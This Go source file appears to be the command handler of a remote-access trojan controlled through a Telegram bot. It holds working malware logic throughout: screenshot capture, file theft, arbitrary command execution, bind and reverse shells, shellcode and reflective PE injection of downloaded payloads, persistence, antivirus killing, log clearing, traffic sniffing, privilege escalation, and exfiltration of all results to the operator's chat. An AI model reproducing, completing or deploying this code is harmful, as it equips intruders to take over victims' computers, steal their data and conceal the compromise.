package commands

import (
	"errors"
	"image/png"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"bitbucket.org/kardianos/osext"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/vova616/screenshot"
	getsetgo "github.com/whiterabb17/getsetgo"
	goliath "github.com/whiterabb17/goliath"
	gryphon "github.com/whiterabb17/gryphon"
	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/roots"
	"github.com/whiterabb17/shaman/package/util"
)

const (
	GHelp = "Gryphon Command Info\n\n" +
		"Commands With Arguments\n" +
		"===========================\n" +
		"``` SliceFile 		    [arg:  string]\t" +
		"Return slice from file\n" +
		" MakeZip 		      [args: string, []string]\t" +
		"Create $zip_name from $fileNames\n" +
		" DnsLookup		     [arg:  string]\t" +
		"Performs DNS Lookup of given hostname\n" +
		" RdnsLookup  	   [arg:  string]\t" +
		"Performs reverse DNS Lookup of given IP\n" +
		" HostsPassive 	  [arg:  string]\t" +
		"ARP Monitors networks at given interval\n" +
		" FilePermissions [arg:  string]\t" +
		"Checks for read/write of given file\n" +
		" Portscan   		   [args: string, int]\t" +
		"Performs multi-port scan\n" +
		" PortscanSingle 	[args: string, int]\t" +
		"Single port scan\n" +
		" BannerGrab    	 [args: string, int]\n" +
		" CmdOut        	 [arg:  string]\t" +
		"Runs a cmd and returns output\n" +
		" CmdOutPlatform 	[arg:  string]\t" +
		"Platform aware cmd run with output return\n" +
		" CmdRun        	 [arg:  string]\t" +
		"Runs cmd without return of data\n" +
		" CmdBlind     	  [arg:  string]\t" +
		"Unsupervision cmd run, no output\n" +
		" CreateUser     	[args: string, string]\t" +
		"Temporarily on supported on windows\n" +
		" Bind            [arg:  int]\t" +
		"Binds a shell to given port\n" +
		" Reverse         [args: string, int]\t" +
		"Runs a reverse shell\n" +
		" SendDataTcp   	 [args: ip/host, int, string]\t" +
		"Sends data to given host using TCP\n" +
		" SendDataUdp    	[args: ip/host, int, string]\t" +
		"Sends data to given host using UDP\n" +
		" ReadFile        [arg:  string]\n" +
		" WriteFile       [arg:  string]\n" +
		" IP2Hex          [arg:  string]\n" +
		" Port2Hex        [arg:  int]\n" +
		" Download        [arg:  string]\n" +
		" CopyFile        [arg:  string, string] \n" +
		" PkillPid        [arg:  int]\n" +
		" PkillName       [arg:  string]\n" +
		" Persist  	      [arg:  string]\t" +
		"Available options: Startup (Win/*Nix), Schtasks (Win ONLY)\n" +
		" SelfInject      [arg:  string]\t" +
		"Url to download a file from to Inject bytes into owned Process\n" +
		" DropInject      [arg:  string]\t" +
		"Url to download a file from to Inject after dropping on disk\n" +
		" ProcInject      [args: string, string]\t" +
		"Downloads binary from provided URL and injects into specified process\n" +
		" RefLoad		       [arg:  string]\t" +
		"Url to download a file from to Reflectively Load into current domain```\n" +
		"Commands Without Arguments\n" +
		"==============================\n" +
		"``` PkillAv        \t" +
		"Kills most common AV\n" +
		" ClearLogs      \t" +
		"Clears most system logs\n" +
		" Interfaces   \t" +
		"Gets network interfaces to use for Sniffing\n" +
		" SniffNetwork   \t" +
		"Starts a network traffic sniffer that writes traffic to file for retrieval\n" +
		" FetchNetLogs   \t" +
		"Retrieves Sniffer logs if they exist\n" +
		" ListDir	\t" +
		"Returns files in yellow directory\n" +
		" Networks       \t" +
		"Returns list of nearby Wi-Fi networks\n" +
		" LocalIP     \t" +
		"Gets Private IP\n" +
		" GlobalIP    \t" +
		"Gets Public IP\n" +
		" IsRoot         \t" +
		"Checks is client is running as root/admin\n" +
		" Proc      \t" +
		"Returns processes and their PIDs\n" +
		" systeminfo     \t" +
		"Returns general system info\n" +
		" Escalate       \t" +
		"Attempts PrivilegeEscalation through various different methods```"
)

func gExfil(message string) {
	msg := tgbotapi.NewMessage(util.ChatID, message)
	msg.ParseMode = "MarkdownV2"
	api.Bot.Send(msg)
}

func GExfil2(message string) {
	msg := tgbotapi.NewMessage(util.ChatID, message)
	msg.ParseMode = "Markdown"
	api.Bot.Send(msg)
}

// Upload Image
func imgBot(f string) {
	img := tgbotapi.NewPhoto(util.ChatID, tgbotapi.FilePath(f))
	img.File.NeedsUpload()
	_, err := api.Bot.Send(img)
	if err != nil {
		gExfil("[**ERROR**] " + err.Error())
	}
	os.Remove(f)
}

// fileGrabber
func grabFiles(dir string, filter string) ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		if strings.Contains(f.Name(), filter) {
			files_in_dir = append(files_in_dir, f.Name())
		}
	}
	return files_in_dir, nil
}
func namer() (string, error) {
	filename, err := osext.Executable()
	if err != nil {
		return "", errors.New("unable to get the current filename")
	}
	return filename, nil
}
func ss(wg *sync.WaitGroup) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
	//bytes, _ := os.ReadFile("./ss.png")
	p, _ := filepath.Abs("./ss.png")
	imgBot(p)
	time.Sleep(3 * time.Second)
	wg.Done()
}

func retProc() {
	data, err := gryphon.Processes()
	if err != nil {
		api.Exfil(err.Error())
	} else {
		var _va1, _va2 string
		_va1 = "%!(EXTRA"
		_va2 = "map[int]string=map["
		_outStr := gryphon.F("", data)
		outStr := strings.Replace(_outStr, " ", "\n", -1)
		outStr1 := strings.Replace(outStr, ":", " : ", -1)
		outStr2 := strings.Replace(outStr1, _va1, "", -1)
		outStr3 := strings.Replace(outStr2, _va2, "", -1)
		api.Exfil(outStr3)
	}
}

func GSwitch(arguments []string) {
	cmd := arguments[0]
	/*
		if len(arguments) > 1 {
			args = strings.Split(strings.Replace(arguments, cmd+" ", "", 1), " ")

			for _, ar := range args {
				//if c != 0 {
				if ar != "" {
					if util.Dbg {
						log.Println("Found Arg: " + ar)
					}
					//		args = append(args, ar)
				}
				//}
			}
			/*
				for c, arg := range args {
					_c := 0
					if _c < c {
						_c++
					}
				}
			* /
		} else {
			cmd = arguments
		}
	*/
	if util.Dbg {
		log.Println("GCommand: " + cmd)
	}
	switch strings.ToLower(cmd) {
	case "ss":
		if util.Dbg {
			log.Println("Screenshot")
		}
		wg := &sync.WaitGroup{}
		wg.Add(1)
		go ss(wg)
		wg.Wait()
	case "slicefile":
		data := gryphon.FileToSlice(arguments[1])
		var data_ string
		for _, _data := range data {
			data_ += _data + "\n"
		}
		api.Exfil(data_)
	case "makezip":
		gryphon.MakeZip(arguments[1], strings.Split(arguments[2], ","))
		api.Exfil("ZIP Created")
	case "readfile":
		data, err := gryphon.ReadFile(arguments[1])
		if err != nil {
			api.Exfil(err.Error())
		} else {
			api.Exfil(data)
		}
	case "writefile":
		gryphon.WriteFile(arguments[1], arguments[2])
		api.Exfil("File Written Successfully")
	case "localip":
		data := gryphon.GetLocalIp()
		api.Exfil(data)
	case "proc":
		retProc()
	case "ps":
		retProc()
	case "find":
		strs := strings.Split(arguments[1], "|")
		getsetgo.Racer(strs[0], strs[1], strs[2])
		api.Exfil("Searching path " + strs[0] + " for Extensions: " + strs[1] + " and archive to " + strs[2])
	case "dropinj":
		if runtime.GOOS == "windows" {
			gryphon.BoosterShot(arguments[1])
			api.Exfil("Attempting to Download & Inject the provided bin from " + arguments[1])
		} else {
			api.Exfil("This feature is currently only implemented in Windows")
		}
	case "procinject":
		if runtime.GOOS == "windows" {
			if gryphon.InjectIntoProcess(arguments[1], "", arguments[2]) {
				api.Exfil("Successfully injected shellcode into " + arguments[1])
			} else {
				api.Exfil("Failed to inject shellcode")
			}
		} else {
			api.Exfil("This feature is currently only implemented in Windows")
		}
	case "selfinject":
		if runtime.GOOS == "windows" {
			if gryphon.CreateThreadInject(arguments[1]) {
				api.Exfil("Successfully injected shellcode into self")
			} else {
				api.Exfil("Failed to inject shellcode into self")
			}
		} else {
			api.Exfil("This feature is currently only implemented in Windows")
		}
	case "refload":
		fname, err := gryphon.Download(arguments[1])
		if err != nil {
			api.Exfil(err.Error())
		} else {
			bytes, er := ioutil.ReadFile(fname)
			if er != nil {
				api.Exfil(err.Error())
			} else {
				gryphon.ReflectiveRunPE(bytes)
				api.Exfil("Attempting to Reflectively load: " + fname)
			}
		}
	case "globalip":
		data := gryphon.GetGlobalIp()
		api.Exfil(data)
	case "isroot":
		if gryphon.IsRoot() {
			api.Exfil("We are root")
		} else {
			api.Exfil("We are not root")
		}
	case "persist":
		gryphon.AddPersistentCommand(arguments[1])
		api.Exfil("Persistence Loaded")
		/*
			case "HostsPassive":
				Exfil("Unimplemented")
		*/
	case "systeminfo":
		data := gryphon.Info()
		var _data string
		for i, v := range data {
			_data += i + ": " + v + "\n"
		}
		if util.Dbg {
			log.Println(_data)
		}
		api.Exfil(_data)
	case "interfaces":
		iface := goliath.ListDevices()
		api.Exfil(iface)
	case "sniff":
		iFace := arguments[1]
		var vars []string
		vars = strings.Split(arguments[2], ",")
		log.Println(iFace)
		log.Println(vars[0] + " " + vars[1])
		var keep bool
		var promisc bool
		if vars[0] == "false" {
			promisc = false
		} else {
			promisc = true
		}
		if vars[1] == "false" {
			keep = false
		} else {
			keep = true
		}
		goliath.SharkWire(iFace, 1024, promisc, keep)
		api.Exfil("Traffic Monitoring Started")
	case "lookfor":
		plg, err := grabFiles(arguments[1], arguments[2])
		if err != nil {
			api.Exfil(err.Error())
		} else {
			for _, C := range plg {
				_ret, er := gryphon.ReadFile(C)
				if er != nil {
					api.Exfil(er.Error())
				} else {
					api.Exfil(_ret)
				}
			}
		}
	case "download":
		name, err := gryphon.Download(arguments[1])
		if err != nil {
			api.Exfil(err.Error())
		} else {
			api.Exfil("Download complete: " + name)
		}
	case "networks":
		data, err := gryphon.Networks()
		if err != nil {
			log.Println("Error: ", err)
			api.Exfil(err.Error())
		}
		api.Exfil(strings.Join(data, "|"))
	case "dnslookup":
		data, err := gryphon.DnsLookup(arguments[1])
		if err != nil {
			log.Println("error: ", err)
			api.Exfil(err.Error())
		}
		api.Exfil(strings.Join(data, "|"))
	case "rdnslookup":
		data, err := gryphon.RdnsLookup(arguments[1])
		if err != nil {
			log.Println("error: ", err)
			api.Exfil(err.Error())
		}
		api.Exfil(strings.Join(data, "|"))
	case "cmd":
		if util.Dbg {
			log.Println("Command: " + arguments[1])
		}
		data, err := gryphon.CmdOut(arguments[1])
		if err != nil {
			log.Println("error: ", err)
			api.Exfil(err.Error())
		}
		api.Exfil(data)
	case "bypass":
		gryphon.Bypass()
		api.Exfil("Attempting Bypass")
	case "escalate":
		path, err := namer()
		if err != nil {
			api.Exfil(err.Error())
		}
		err2 := gryphon.Escalate(path)
		api.Exfil("Attempting to Escalate: " + err2)
	case "createuser":
		err := gryphon.CreateUser(arguments[1], arguments[2])
		if err != nil {
			api.Exfil("Could not create user")
		} else {
			api.Exfil("Created user successfully")
		}
	case "bind":
		gryphon.Bind(gryphon.StrToInt(arguments[1]))
		api.Exfil("Binding Complete")
	case "reverse":
		gryphon.Reverse(arguments[1], gryphon.StrToInt(arguments[2]))
		api.Exfil("Reverse shell executed")
	case "listdir":
		data, err := gryphon.TraverseCurrentDir()
		if err != nil {
			api.Exfil(err.Error())
		} else {
			var count int = 0
			var _data string
			for _, v := range data {
				count++
				_data += gryphon.IntToStr(count) + ": " + v + "\n"
			}
			api.Exfil(_data)
		}
	case "pkillpid":
		err := gryphon.PkillPid(gryphon.StrToInt(arguments[1]))
		if err != nil {
			api.Exfil("Could not kill PID")
		} else {
			api.Exfil("PID killed Successfully")
		}
	case "pkillname":
		err := gryphon.PkillName(arguments[1])
		if err != nil {
			api.Exfil("Could not kill Process")
		} else {
			api.Exfil("Process killed Successfully")
		}
	case "pkillav":
		err := gryphon.PkillAv()
		if err != nil {
			api.Exfil("Could not kill AVs")
		} else {
			api.Exfil("AVs killed successfully")
		}
	case "die":
		os.Exit(0)
	case "destroy":
		roots.Bury()
	case "clearlogs":
		err := gryphon.ClearLogs()
		if err != nil {
			api.Exfil("Logs could not be cleared")
		} else {
			api.Exfil("Logs cleared successfully")
		}
	default:
		GExfil2(GHelp)
	}
}
